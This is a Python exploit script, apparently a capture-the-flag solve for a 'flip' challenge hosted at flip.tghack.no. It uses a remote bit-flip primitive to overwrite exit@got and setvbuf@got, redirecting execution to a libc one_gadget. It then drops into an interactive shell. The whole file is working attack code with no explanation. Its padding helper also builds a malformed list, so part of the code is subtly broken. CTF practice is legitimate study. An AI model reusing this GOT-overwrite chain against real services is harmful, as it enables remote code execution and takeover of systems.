from ptrlib import *

def flip(writes):
    for item in writes:
        sock.recvuntil("flip: ")
        sock.sendline(hex(item[0]) + ":" + str(item[1]))

def change(addr, a, b):
    l = []
    for i, (x, y) in enumerate(zip(a, b)):
        for j in range(8):
            if ((x >> j) & 1) ^ ((y >> j) & 1) == 1:
                l.append((addr + i, j))
    if len(l) % 5 != 0:
        l += [(addr_whatever, 0) * (5 - (len(l) % 5))]
    flip(l)
        
elf = ELF("./flip")
libc = ELF("./libc.so.6")
sock = Socket("flip.tghack.no", 1947)
#sock = Process("./flip")

delta = 0x18000
addr_whatever = elf.symbol("__bss_start")
got_exit = elf.got("exit")
libc_one_gadget = 0x4f322

# write _start to exit@got(-->0x400766)
sock.recvuntil("that's it!\n")
flip((
    (got_exit, 1),
    (got_exit, 2),
    (got_exit, 4),
    (addr_whatever, 0),
    (addr_whatever, 0)
))

# write main to exit@got(-->0x400770)
sock.recvuntil("that's it!\n")
flip((
    (got_exit, 4),
    (got_exit, 5),
    (got_exit+1, 1),
    (got_exit+1, 2),
    (got_exit+1, 3)
))

# write one gadget to setvbuf@got
sock.recvuntil("that's it!\n")
change(elf.got("setvbuf"), p32(libc_one_gadget ^ delta), p32(libc.symbol("setvbuf")))

# write _start to exit@got(-->0x400940)
sock.recvuntil("that's it!\n")
flip((
    (got_exit, 4),
    (got_exit, 5),
    (got_exit+1, 1),
    (got_exit+1, 2),
    (got_exit+1, 3)
))

sock.interactive()
